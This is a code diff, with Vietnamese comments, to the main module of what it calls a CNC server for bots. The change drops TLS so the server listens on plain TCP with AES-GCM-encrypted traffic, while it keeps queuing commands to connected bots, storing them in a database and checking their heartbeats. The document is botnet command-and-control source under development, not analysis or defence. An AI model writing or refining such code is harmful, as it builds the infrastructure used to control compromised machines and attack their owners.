@@ -1,5 +1,5 @@
 """
-CNC Server chính — lắng nghe kết nối từ bot qua TLS/TCP.
+CNC Server chính — lắng nghe kết nối từ bot qua TCP (AES-GCM encrypted).
 
 Dùng asyncio để xử lý hàng trăm kết nối đồng thời.
 """
@@ -9,7 +9,6 @@ import asyncio
 import logging
 import os
 import signal
-import ssl
 import sys
 
 import yaml
@@ -47,17 +46,6 @@ class CNCServer:
         # Database
         await self._db.connect()
 
-        # TLS context
-        tls_cert = self.config.get("server", {}).get("tls_cert", "")
-        tls_key = self.config.get("server", {}).get("tls_key", "")
-        ssl_ctx = None
-        if tls_cert and tls_key and os.path.exists(tls_cert) and os.path.exists(tls_key):
-            ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-            ssl_ctx.load_cert_chain(tls_cert, tls_key)
-            logger.info("TLS enabled: %s", tls_cert)
-        else:
-            logger.warning("TLS disabled — cert/key not found. Generate with scripts/generate_certs.sh")
-
         # Start server
         host = self.config.get("server", {}).get("host", "0.0.0.0")
         port = self.config.get("server", {}).get("port", 8443)
@@ -65,9 +53,8 @@ class CNCServer:
         self._server = await asyncio.start_server(
             lambda r, w: handle_bot(r, w, self._crypto, self._db, self._cmd_queue),
             host, port,
-            ssl=ssl_ctx,
         )
-        logger.info("CNC Server listening on %s:%s", host, port)
+        logger.info("CNC Server listening on %s:%s (plain TCP, AES-GCM)", host, port)
 
         # Background tasks
         self._tasks.append(asyncio.create_task(self._heartbeat_checker()))
